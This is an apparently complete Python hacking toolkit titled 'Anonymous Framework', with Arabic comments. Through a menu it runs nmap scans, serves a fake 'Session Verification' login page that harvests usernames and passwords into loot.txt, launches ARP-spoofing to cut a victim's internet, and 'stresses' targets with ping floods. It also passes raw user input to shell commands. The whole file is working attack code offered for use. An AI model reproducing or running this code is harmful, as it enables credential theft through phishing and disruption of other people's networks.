import http.server
import os
import socketserver
import sys
import time
import urllib.parse


# دالة لعرض بانر الأداة
def banner():
  os.system("clear")
  print("=" * 60)
  print("    === ANONYMOUS FRAMEWORK - ULTIMATE MASTER ===")
  print("=" * 60)
  print("1. Network Recon & Nmap Scan")
  print("2. Advanced Phishing Server & Credential Harvester")
  print("3. Real MITM & Net-Cut Attack (Arpspoof)")
  print("4. IP Tracker & Stresser Simulation")
  print("5. View Captured Data (Loot)")
  print("6. Exit Framework")
  print("=" * 60)


# 1. فحص الشبكة بأداة Nmap الحقيقية
def network_recon():
  os.system("clear")
  print("[*] === NETWORK RECON (NMAP) ===")
  target = input("[?] Enter Target IP or Subnet (e.g., 192.168.1.1): ")
  print(f"[*] Scanning {target} using Nmap...")
  os.system(f"nmap -F {target}")
  input("\n[Press Enter to return to main menu]")


# 2. سيرفر التصيد الحقيقي وحفظ البيانات في loot.txt
def phishing_server():
  PORT = 8080
  os.system("clear")
  print(f"[*] Starting Phishing Server on http://localhost:{PORT}")
  print("[*] Captured credentials will be saved automatically to 'loot.txt'")
  print("[*] Press Ctrl+C to stop the server and return to menu.\n")

  class PhishingHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
      content_length = int(self.headers["Content-Length"])
      post_data = self.rfile.read(content_length)
      parsed_data = urllib.parse.parse_qs(post_data.decode("utf-8"))

      print(f"\n[!] ALERT! TARGET DATA CAPTURED: {parsed_data}")

      with open("loot.txt", "a") as f:
        f.write(f"Captured Data: {str(parsed_data)}\n")

      self.send_response(200)
      self.end_headers()
      self.wfile.write(b"<html><body><h1>Verified. Redirecting...</h1></body></html>")

    def do_GET(self):
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      html_content = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Security Verification</title>
                <style>
                    body { font-family: Arial, sans-serif; background: #121212; color: #fff; text-align: center; padding-top: 100px; }
                    .box { background: #1e1e1e; display: inline-block; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px #00ffcc; }
                    input { width: 250px; padding: 10px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; color: #fff; border-radius: 4px; }
                    button { background: #00ffcc; color: #000; border: none; padding: 10px 20px; font-weight: bold; border-radius: 4px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="box">
                    <h2>Session Verification Required</h2>
                    <p>Please log in to continue accessing the secure portal.</p>
                    <form method="POST">
                        <input type="text" name="username" placeholder="Username / Email" required><br>
                        <input type="password" name="password" placeholder="Password" required><br>
                        <button type="submit">Verify & Continue</button>
                    </form>
                </div>
            </body>
            </html>
            """
      self.wfile.write(html_content.encode("utf-8"))

  try:
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
      httpd.serve_forever()
  except KeyboardInterrupt:
    print("\n[!] Phishing server stopped. Returning to main menu...")
    time.sleep(1.5)


# 3. هجوم قطع النت الحقيقي (Arpspoof)
def real_mitm_attack():
  os.system("clear")
  print("[*] === REAL MITM & NET-CUT (ARPSPOOF) ===")
  target_ip = input("[?] Enter Victim IP to cut internet: ")
  gateway_ip = input("[?] Enter Router/Gateway IP: ")
  interface = input(
      "[?] Enter Network Interface (default is wlan0, or type your interface): "
  )
  if not interface:
    interface = "wlan0"

  print(
      f"[*] Launching REAL ARP Poisoning on {target_ip} using interface"
      f" {interface}..."
  )
  print("[!] Press Ctrl+C to stop the attack and restore network.")
  
  try:
    os.system(f"arpspoof -i {interface} -t {target_ip} {gateway_ip}")
  except KeyboardInterrupt:
    print("\n[+] Attack stopped by user.")
    time.sleep(1)


# 4. محاكاة تتبع وضغط الـ IP
def ip_tracker_stresser():
  os.system("clear")
  print("[*] === IP TRACKER & STRESSER ===")
  target_ip = input("[?] Enter Target IP Address: ")
  print(f"[*] Analyzing IP: {target_ip}...")
  time.sleep(1.5)
  print("[+] Status: Online & Active")
  packets = int(input("[?] Enter number of packets to ping/stress: "))
  os.system(f"ping -c {packets} {target_ip}")
  input("\n[Press Enter to return to main menu]")


# 5. عرض الملفات المسروقة (Loot)
def view_loot():
  os.system("clear")
  print("[*] === CAPTURED LOOT (loot.txt) ===")
  if os.path.exists("loot.txt"):
    with open("loot.txt", "r") as f:
      content = f.read()
      print(content if content else "[*] File is currently empty.")
  else:
    print("[-] No loot file found yet. Run the phishing server first.")
  input("\n[Press Enter to return to main menu]")


# التشغيل الرئيسي للأداة
def main():
  while True:
    banner()
    choice = input("\nAnonymous-Master@Root:~# ")

    if choice == "1":
      network_recon()
    elif choice == "2":
      phishing_server()
    elif choice == "3":
      real_mitm_attack()
    elif choice == "4":
      ip_tracker_stresser()
    elif choice == "5":
      view_loot()
    elif choice == "6" or choice.lower() == "exit":
      print("\n[!] Cleaning up sessions... Exiting Framework.")
      sys.exit(0)
    else:
      print("\n[!] Invalid command, try again.")
      time.sleep(1.5)


if __name__ == "__main__":
  main()

